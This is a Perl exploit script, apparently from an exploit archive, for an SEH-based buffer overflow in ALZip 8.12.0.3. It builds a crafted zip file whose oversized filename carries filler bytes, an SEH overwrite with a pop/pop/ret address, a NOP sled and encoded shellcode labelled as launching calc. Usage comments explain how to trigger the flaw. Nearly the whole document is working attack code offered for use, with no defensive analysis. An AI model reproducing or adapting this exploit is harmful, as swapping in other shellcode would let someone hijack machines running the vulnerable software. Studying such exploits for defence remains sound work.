#
#
#[+]Exploit Title: Exploit Buffer Overflow AlZip(SEH)
#[+]Date: 01\19\2010
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.altools.com/al/downloads/alzip/ALZip812.exe
#[+]Version: 8.12.0.3
#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN
#[+]CVE: N/A
#
#
#
#Note:Exploit for the work you have to run program in DOS
#
#C: \&gt; Exploit.pl exploit.zip
#
#In this case my Exploit Creates the zip file exploit.zip
#In the open ALZip Click &quot;OPEN&quot;pass the mouse over the specially crafted file and 
#keeps the mouse on top of the file does not click on it and wait then BOOM APPEARS THE CALC
#
#Watch This Video: http://www.youtube.com/watch?v=PTV_tZinI6w
#
#
#  #########     ##    #########      #########   ##     ###############
#   ########    ####    #########      #########   ##     ##           ##    
#   ##         ## ##    ##             ##          ##     ##           ##  
#   ##        ##  ##    ##             ##          ##     ##           ##
#   ##       ########## ########       ########    ##     ##           ##
#   ##            ##          ##             ##    ##     ##           ##
#   ##            ##          ##             ##    ##     ##           ##
#   ########      ##    ########      #########    ##     ##           ##
#   ########      ##    ########      #########    \/     ###############
#                                               
#
#
#

use strict;
use warnings;

system(&quot;cls&quot;);
system(&quot;color 4f&quot;);
sub USAGE
{
print q
{        
         #############################################
         #                                           #
         #  Exploit Buffer Overflow AlZip(SEH)       #   
         #  C4SS!0 G0M3S                             #
         #  Louredo_@hotmail.com                     #
         #  Site http://www.invasao.com.br           #
         #	                                     #  
         #############################################

[+]Exploit: Exploit Buffer Overflow AlZip(SEH)	  
[+]Date: 01\\19\\2010
[+]Auhtor: C4SS!0 G0M3S
[+]Home: http://www.invasao.com.br
[+]E-mail: Louredo_@hotmail.com
[+]Version: 8.12.0.3
[+]Impact: Critical

Note:
Look Comments Above for More Information as the Exploit Works

};
}
if($#ARGV!=0)
{
USAGE;
print &quot;[-]Usage: $0 &lt;File_Name&gt;\n&quot;;
print &quot;[-]Exemple: $0 Exploit.zip\n&quot;;

exit(0);
}
my $sploitfile=$ARGV[0];
my $ldf_header = &quot;\x50\x4B\x03\x04\x14\x00\x00&quot;.
&quot;\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot; .
&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot; .
&quot;\xe4\x0f&quot; .
&quot;\x00\x00\x00&quot;;

my $cdf_header = &quot;\x50\x4B\x01\x02\x14\x00\x14&quot;.
&quot;\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot; .
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\xe4\x0f&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x01\x00&quot;.
&quot;\x24\x00\x00\x00\x00\x00\x00\x00&quot;;

my $eofcdf_header = &quot;\x50\x4B\x05\x06\x00\x00\x00&quot;.
&quot;\x00\x01\x00\x01\x00&quot;.
&quot;\x12\x10\x00\x00&quot;.
&quot;\x02\x10\x00\x00&quot;.
&quot;\x00\x00&quot;;
USAGE;
print &quot;[*]Identifying the Length Shellcode\n&quot;;
sleep(1);
my $shellcode = 
&quot;\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1&quot; .
&quot;\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30&quot; .
&quot;\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa&quot; .
&quot;\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96&quot; .
&quot;\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b&quot; .
&quot;\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a&quot; .#Shellcode WINEXEC CALC
&quot;\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83&quot; .
&quot;\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98&quot; .
&quot;\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61&quot; .
&quot;\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05&quot; .
&quot;\x7f\xe8\x7b\xca&quot;;


my $payload = &quot;A&quot; x 1060;
$payload .= &quot;\xeb\x08\x90\x90&quot;;
$payload .= pack(&#039;V&#039;,0x61309258);
$payload .= &quot;\x90&quot; x 10;
$payload .= $shellcode;


print &quot;[*]The length Shellcode:&quot;.length($shellcode).&quot;\n&quot;;
sleep(1);
$payload .= &quot;\x42&quot; x (4064 - length($payload));


$payload=$payload.&quot;.txt&quot;;

my $evilzip = $ldf_header.$payload.
              $cdf_header.$payload.
			  $eofcdf_header;

print &quot;[*]Creating the File $ARGV[0]\n&quot;;
sleep(1);
open(FILE,&quot;&gt;$sploitfile&quot;) or die(&quot;ERROR:$!&quot;);
print FILE $evilzip;
close(FILE);
print &quot;[*]The File $ARGV[0] was Successfully Created\n&quot;;
sleep(1);